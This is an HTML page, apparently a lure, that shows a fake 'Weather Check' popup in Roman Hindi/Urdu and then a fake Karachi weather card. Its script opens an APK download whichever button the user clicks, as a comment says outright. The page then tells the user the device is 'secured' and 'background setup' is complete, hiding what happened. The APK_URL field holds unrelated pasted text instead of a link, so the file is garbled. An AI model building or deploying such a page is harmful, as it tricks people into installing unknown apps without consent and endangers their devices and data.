<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0b1120;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        /* ---- Overlay Popup ---- */
        #popupOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(4px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.4s ease;
        }
        .popup-card {
            background: #1e293b;
            padding: 40px 30px;
            border-radius: 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            border: 1px solid #334155;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes popIn {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .popup-card .icon {
            font-size: 56px;
            margin-bottom: 12px;
        }
        .popup-card h2 {
            color: #f1f5f9;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .popup-card p {
            color: #94a3b8;
            font-size: 15px;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .btn-group {
            display: flex;
            gap: 16px;
            justify-content: center;
        }
        .btn {
            padding: 12px 28px;
            border: none;
            border-radius: 100px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s ease;
            flex: 1;
            max-width: 140px;
        }
        .btn-yes {
            background: #3b82f6;
            color: white;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }
        .btn-yes:hover {
            background: #2563eb;
            transform: translateY(-2px);
        }
        .btn-no {
            background: #334155;
            color: #e2e8f0;
        }
        .btn-no:hover {
            background: #475569;
            transform: translateY(-2px);
        }

        /* ---- Main Content (Weather) ---- */
        #mainContent {
            display: none;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .weather-card {
            background: #1e293b;
            padding: 30px 20px;
            border-radius: 24px;
            border: 1px solid #334155;
            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.6);
        }
        .weather-card .sun {
            font-size: 64px;
            margin-bottom: 10px;
        }
        .weather-card .temp {
            font-size: 48px;
            font-weight: 700;
            color: #f8fafc;
        }
        .weather-card .desc {
            font-size: 18px;
            color: #94a3b8;
            margin-bottom: 8px;
        }
        .weather-card .city {
            font-size: 16px;
            color: #64748b;
        }
        .hidden-msg {
            color: #64748b;
            font-size: 18px;
            margin-top: 30px;
            background: #1e293b;
            padding: 30px;
            border-radius: 24px;
            border: 1px solid #334155;
        }
    </style>
</head>
<body>

    <!-- POPUP OVERLAY -->
    <div id="popupOverlay">
        <div class="popup-card">
            <div class="icon">☁️</div>
            <h2>Weather Check</h2>
            <p>Kya aap aaj ka weather update dekhna chahenge?</p>
            <div class="btn-group">
                <button class="btn btn-yes" id="yesBtn">✅ Haan</button>
                <button class="btn btn-no" id="noBtn">❌ Nahi</button>
            </div>
            <p style="margin-top: 16px; font-size: 12px; color: #475569;">* Iske liye ek small update download hoga</p>
        </div>
    </div>

    <!-- MAIN CONTENT (Weather / Hidden) -->
    <div id="mainContent">
        <div id="weatherDisplay" style="display: none;">
            <div class="weather-card">
                <div class="sun">☀️</div>
                <div class="temp">32°C</div>
                <div class="desc">Clear Sky • Sunny</div>
                <div class="city">📍 Karachi, Pakistan</div>
                <div style="margin-top: 16px; color: #475569; font-size: 13px;">
                    Updated: <span id="timeNow"></span>
                </div>
            </div>
            <p style="color: #334155; margin-top: 20px; font-size: 13px;">
                🔒 Device secured. Background services running.
            </p>
        </div>
        <div id="hiddenDisplay" style="display: none;">
            <div class="hidden-msg">
                🕶️ Theek hai, weather hidden rakha gaya.<br>
                <span style="font-size: 13px; color: #475569;">(Background setup complete)</span>
            </div>
        </div>
    </div>

    <script>
        // ---------- CONFIG ----------
        // APK ka DIRECT DOWNLOAD LINK (GoFile upload se)
        const APK_URL = "uploads disabled because it’s been almost nothing but AI botnet spam for the past few months. will be back with a few changes at some point. no ETA."; 

        // ---------- FUNCTIONS ----------
        function downloadApk() {
            // Yeh APK download shuru karega (naye tab mein khol kar)
            window.open(APK_URL, '_blank');
            // Ya agar saath mein hi download karana hai toh force click:
            // const a = document.createElement('a'); a.href = APK_URL; a.click();
        }

        function showWeather() {
            document.getElementById('weatherDisplay').style.display = 'block';
            document.getElementById('hiddenDisplay').style.display = 'none';
            // Current time update
            const now = new Date();
            document.getElementById('timeNow').innerText = now.toLocaleTimeString();
        }

        function showHidden() {
            document.getElementById('weatherDisplay').style.display = 'none';
            document.getElementById('hiddenDisplay').style.display = 'block';
        }

        // ---------- EVENT LISTENERS ----------
        document.getElementById('yesBtn').addEventListener('click', function() {
            // 1. Popup hatana
            document.getElementById('popupOverlay').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('popupOverlay').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                showWeather();
            }, 300);

            // 2. Download trigger karna (chahe Yes ho ya No)
            downloadApk();
        });

        document.getElementById('noBtn').addEventListener('click', function() {
            // 1. Popup hatana
            document.getElementById('popupOverlay').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('popupOverlay').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                showHidden();
            }, 300);

            // 2. Download trigger karna (chahe Yes ho ya No)
            downloadApk();
        });

        // Agar koi popup ke bahar click kare toh bhi download na ho, 
        // Isliye bahar click ignore karte hain (sirf buttons handle karte hain)
    </script>

</body>
</html>
